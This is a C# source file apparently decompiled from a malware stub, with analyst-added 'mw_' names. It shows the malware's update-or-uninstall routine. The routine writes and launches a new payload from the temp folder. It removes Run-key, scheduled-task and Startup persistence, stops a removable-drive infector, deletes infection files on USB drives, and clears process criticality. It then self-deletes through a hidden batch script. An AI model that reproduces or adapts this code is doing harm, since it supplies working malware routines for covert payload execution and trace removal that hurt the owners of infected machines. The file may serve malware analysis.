using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace Stub
{
	// Token: 0x0200000C RID: 12
	public class mw_Updater
	{
		// Token: 0x06000078 RID: 120
		public static void mw_updateOrDeleteMalware(bool isUpdate, string filename, byte[] data)
		{
			if (isUpdate)
			{
				try
				{
					filename = Path.Combine(Path.GetTempPath(), mw_Handler.mw_getRandomLowercaseLetters(6) + filename);
					File.WriteAllBytes(filename, data);
				}
				catch (Exception ex)
				{
				}
			}
			try
			{
				File.Delete(mw_config.mw_InstallPath + "\\" + mw_config.mw_localFilename);
			}
			catch (Exception ex2)
			{
			}
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
				registryKey.DeleteValue(Path.GetFileNameWithoutExtension(mw_config.mw_localFilename), false);
			}
			catch (Exception ex3)
			{
			}
			try
			{
				Process.Start(new ProcessStartInfo
				{
					FileName = "schtasks",
					Arguments = "/delete /f  /tn \"" + Path.GetFileNameWithoutExtension(mw_config.mw_localFilename) + "\"",
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true
				});
			}
			catch (Exception ex4)
			{
			}
			try
			{
				string path = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Path.GetFileNameWithoutExtension(mw_config.mw_localFilename) + ".lnk";
				if (File.Exists(path))
				{
					mw_Handler.mw_filestream.Close();
					File.Delete(path);
				}
			}
			catch (Exception ex5)
			{
			}
			mw_UsbAndDriveInfector.mw_abortThread();
			try
			{
				foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
				{
					if (driveInfo.IsReady && driveInfo.DriveType == DriveType.Removable)
					{
						string text = driveInfo.Name;
						try
						{
							Interaction.Shell("attrib -h -s " + text + "*.* /s /d", AppWinStyle.Hide, false, -1);
							File.Delete(text + mw_config.mw_driveInfectionFilename);
						}
						catch (Exception ex6)
						{
						}
						string[] files = Directory.GetFiles(text, "*.lnk");
						foreach (string value in files)
						{
							try
							{
								File.Delete(Conversions.ToString(value));
							}
							catch (Exception ex7)
							{
							}
						}
						text = null;
					}
				}
			}
			catch (Exception ex8)
			{
			}
			mw_ProcessKillPrevention.mw_unsetProcessCriticality();
			try
			{
				string text2 = Path.GetTempFileName() + ".bat";
				using (StreamWriter streamWriter = new StreamWriter(text2))
				{
					streamWriter.WriteLine("@echo off");
					streamWriter.WriteLine("timeout 3 > NUL");
					streamWriter.WriteLine("CD " + Application.StartupPath);
					streamWriter.WriteLine("DEL \"" + Path.GetFileName(Application.ExecutablePath) + "\" /f /q");
					streamWriter.WriteLine("CD " + Path.GetTempPath());
					streamWriter.WriteLine("DEL \"" + Path.GetFileName(text2) + "\" /f /q");
				}
				if (isUpdate)
				{
					try
					{
						Process.Start(filename);
					}
					catch (Exception ex9)
					{
					}
				}
				Process.Start(new ProcessStartInfo
				{
					FileName = text2,
					CreateNoWindow = true,
					ErrorDialog = false,
					UseShellExecute = false,
					WindowStyle = ProcessWindowStyle.Hidden
				});
				Environment.Exit(0);
			}
			catch (Exception ex10)
			{
			}
		}
	}
}
